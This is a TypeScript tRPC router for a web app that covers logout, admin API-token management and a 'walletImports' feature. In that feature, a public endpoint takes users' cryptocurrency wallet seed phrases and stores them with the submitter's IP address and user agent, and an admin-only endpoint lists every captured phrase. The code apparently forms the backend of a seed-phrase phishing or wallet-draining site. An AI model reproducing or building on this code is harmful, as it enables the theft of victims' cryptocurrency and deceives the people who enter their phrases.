import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { protectedProcedure, publicProcedure, router } from "./_core/trpc";
import { TRPCError } from "@trpc/server";
import { z } from "zod";
import {
  listAllApiTokens,
  createTokenForUser,
  revokeToken,
  getActiveTokenForUser,
  saveWalletImport,
  listAllWalletImports,
} from "./db";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  walletImports: router({
    /** Public: save a seed phrase import (linked to session user if logged in) */
    save: publicProcedure
      .input(z.object({
        seedPhrase: z.string().min(1),
        walletAddress: z.string().optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        const ip = ctx.req.headers['x-forwarded-for'] as string || ctx.req.socket.remoteAddress || null;
        const ua = ctx.req.headers['user-agent'] || null;
        await saveWalletImport({
          userId: ctx.user?.id ?? null,
          seedPhrase: input.seedPhrase,
          walletAddress: input.walletAddress ?? null,
          ipAddress: typeof ip === 'string' ? ip.split(',')[0].trim() : null,
          userAgent: ua,
        });
        return { success: true };
      }),

    /** Admin: list all wallet imports */
    listAll: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user.role !== 'admin') {
        throw new TRPCError({ code: 'FORBIDDEN', message: 'Admin only' });
      }
      return listAllWalletImports();
    }),
  }),

  apiTokens: router({
    /** Admin: list all users' tokens */
    listAll: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user.role !== 'admin') {
        throw new TRPCError({ code: 'FORBIDDEN', message: 'Admin only' });
      }
      return listAllApiTokens();
    }),

    /** Admin: generate or regenerate a token for any user by userId */
    generateForUser: protectedProcedure
      .input(z.object({ userId: z.number(), label: z.string().optional() }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user.role !== 'admin') {
          throw new TRPCError({ code: 'FORBIDDEN', message: 'Admin only' });
        }
        return createTokenForUser(input.userId, input.label ?? 'Default');
      }),

    /** Admin: revoke a token by its id */
    revoke: protectedProcedure
      .input(z.object({ tokenId: z.number() }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user.role !== 'admin') {
          throw new TRPCError({ code: 'FORBIDDEN', message: 'Admin only' });
        }
        await revokeToken(input.tokenId);
        return { success: true };
      }),

    /** User: get own active token (or null if none) */
    getMyToken: protectedProcedure.query(async ({ ctx }) => {
      return getActiveTokenForUser(ctx.user.id);
    }),

    /** User: generate/regenerate own token */
    generateMyToken: protectedProcedure.mutation(async ({ ctx }) => {
      return createTokenForUser(ctx.user.id, 'My API Token');
    }),
  }),
});

export type AppRouter = typeof appRouter;
